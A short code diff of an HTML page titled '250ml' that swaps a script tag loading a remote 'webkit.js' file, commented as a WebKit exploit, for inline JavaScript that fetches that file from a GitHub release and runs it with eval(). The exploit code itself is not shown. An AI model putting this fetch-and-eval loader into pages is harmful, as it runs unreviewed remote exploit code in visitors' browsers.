@@ -4,7 +4,14 @@
   <meta charset="UTF-8" />
   <title>250ml</title>
   <link rel="stylesheet" href="style250.css" />
-  <script src="https://github.com/A5x0/500ml-Incomplete-Currently-Unusable/releases/download/tag/webkit.js" defer></script> <!-- WebKit exploit -->
+  <script>
+   fetch("https://github.com/A5x0/500ml-Incomplete-Currently-Unusable/releases/download/tag/webkit.js")
+    .then(res => res.text())
+    .then(code => eval(code))
+    .catch(() => {
+     document.getElementById("status").textContent = "Failed to load webkit.js";
+    });
+</script>
 </head>
 <body>
   <div class="container">
